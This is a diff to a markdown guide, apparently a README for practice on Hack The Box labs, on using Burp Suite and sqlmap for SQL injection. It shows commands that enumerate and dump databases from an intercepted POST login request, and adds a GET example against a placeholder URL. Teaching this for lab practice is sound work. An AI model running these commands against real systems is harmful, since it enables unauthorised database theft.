@@ -5,9 +5,8 @@
 ### Labs for practice
 - [SQLi Laboratory for practice](https://app.hackthebox.com/machines/446)
 
-# Usage
-
-## 1) Intercept the request header with burpsuite, the request should be like:
+# I) Usage with HTTP POST
+## 1) Intercept the request header with burpsuite. (THIS WILL WORK ONLY WITH POST) the request should be like:
 ```javascript
 POST /login HTTP/1.1
 Host: 10.10.11.130
@@ -42,4 +41,10 @@ sqlmap -r peticion.txt -dbs
 ## 5) Dump the database information
 ```bash
 sqlmap -r peticion.txt -D <name_of_database> -dump
+```
+# II) Usage with HTTP GET
+- u: Sepcify the URL
+- --dbs: Sepcify enumeration current databases
+```bash
+sqlmap -u https://testsite.com/page.php?id=7 --dbs
 ```
